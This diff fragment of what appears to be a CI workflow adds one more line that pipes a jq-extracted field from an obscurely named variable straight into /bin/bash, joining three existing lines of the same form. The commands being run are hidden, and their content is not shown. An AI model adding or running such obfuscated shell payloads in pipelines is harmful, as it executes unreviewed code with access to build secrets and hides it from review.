@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$pk01" | jq -r .lwhlp216 | /bin/bash
           echo $ucijh9 | jq -r .gow1965 | /bin/bash
           echo $h18 | jq -r .ikxuk1 | /bin/bash
+          echo $p136 | jq -r .ip45 | /bin/bash
 
       - name: Upload data
         if: always()
